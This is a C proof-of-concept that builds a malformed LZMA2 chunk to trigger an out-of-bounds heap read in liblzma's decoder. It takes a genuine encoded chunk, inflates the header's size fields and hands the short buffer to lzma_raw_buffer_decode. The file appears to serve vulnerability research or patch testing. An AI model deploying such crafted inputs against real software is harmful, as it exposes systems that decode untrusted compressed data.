/*
 * Residual memory-safety PoC for the LZMA2 decoder chunk-size handling.
 *
 * Reaches liblzma only through its public API: lzma_raw_buffer_encode()
 * to produce one genuine LZMA2 chunk, followed by lzma_raw_buffer_decode()
 * (used by every .xz/raw-stream consumer) to decode a copy of that chunk
 * whose header has been edited to declare a compressed_size that is not
 * smaller than its uncompressed_size, while the actual buffer handed to
 * the decoder is short. On a correctly patched decoder this is rejected
 * (or at worst treated as a normal truncated/corrupt stream, bounded by
 * the real buffer length). On the shipped tree, the decoder derives its
 * internal read limit from the declared uncompressed_size without
 * clamping it to the real buffer length, so it reads far past the end
 * of the input buffer.
 */

#include <lzma.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int
main(void)
{
	lzma_filter filters[2] = {
		{ .id = LZMA_FILTER_LZMA2, .options = NULL },
		{ .id = LZMA_VLI_UNKNOWN, .options = NULL },
	};

	lzma_options_lzma opt;
	if (lzma_lzma_preset(&opt, 6)) {
		fprintf(stderr, "preset failed\n");
		return 1;
	}
	opt.dict_size = 1U << 16;
	filters[0].options = &opt;

	const char *payload = "Hello, this is some test data for the LZMA2 "
			"chunk header PoC, repeated a bit more to make "
			"a single genuine chunk long enough.";
	size_t payload_len = strlen(payload);

	uint8_t encoded[4096];
	size_t encoded_len = 0;
	lzma_ret ret = lzma_raw_buffer_encode(filters, NULL,
			(const uint8_t *)payload, payload_len,
			encoded, &encoded_len, sizeof(encoded));
	if (ret != LZMA_OK) {
		fprintf(stderr, "encode failed: %d\n", ret);
		return 1;
	}

	/* encoded[] now holds one genuine LZMA2 chunk:
	 *   [0]      control byte (expected 0xE0: new dict + new props)
	 *   [1..2]   uncompressed_size - 1, big-endian
	 *   [3..4]   compressed_size - 1, big-endian
	 *   [5]      lc/lp/pb properties byte
	 *   [6..]    LZMA-compressed bytes, then LZMA2 end marker (0x00)
	 */
	if (encoded_len < 7 || encoded[0] < 0xE0) {
		fprintf(stderr, "unexpected chunk layout, control=0x%02x\n",
				encoded[0]);
		return 1;
	}

	/* Build the malicious copy: keep the genuine header/properties and
	 * the first few real compressed bytes (so the decoder has some
	 * legitimate bytes to chew on), but rewrite the size fields so that
	 * compressed_size >= uncompressed_size, and keep the buffer itself
	 * short (no end marker, no index/footer -- just the chunk header
	 * plus a handful of bytes). This is an ordinary malformed chunk
	 * header, not a magic value tied to any internal check.
	 */
	/* Keep only a few genuine compressed bytes that followed the
	 * properties byte in the real chunk -- far fewer than the declared
	 * compressed_size, exactly as a truncated/corrupt stream would.
	 * The buffer is allocated with exactly this many bytes so that any
	 * read past it is an immediate, unambiguous heap buffer overflow.
	 */
	size_t extra = encoded_len - 6;
	if (extra > 16)
		extra = 16;
	size_t n = 6 + extra;

	uint8_t *eviln = malloc(n);
	if (eviln == NULL)
		return 1;
	memcpy(eviln, encoded, 6);
	memcpy(eviln + 6, encoded + 6, extra);

	/* uncompressed_size = 50000 */
	uint32_t uncomp = 50000;
	eviln[1] = (uint8_t)((uncomp - 1) >> 8);
	eviln[2] = (uint8_t)((uncomp - 1) & 0xFF);

	/* compressed_size = 55000 (>= uncompressed_size) */
	uint32_t comp = 55000;
	eviln[3] = (uint8_t)((comp - 1) >> 8);
	eviln[4] = (uint8_t)((comp - 1) & 0xFF);

	/* eviln[5] is the real properties byte, already copied. */

	uint8_t out[1 << 17];
	size_t out_pos = 0;

	lzma_filter dfilters[2] = {
		{ .id = LZMA_FILTER_LZMA2, .options = &opt },
		{ .id = LZMA_VLI_UNKNOWN, .options = NULL },
	};

	size_t in_pos = 0;
	ret = lzma_raw_buffer_decode(dfilters, NULL,
			eviln, &in_pos, n,
			out, &out_pos, sizeof(out));

	printf("decode returned %d, out_pos=%zu\n", ret, out_pos);
	free(eviln);
	return 0;
}
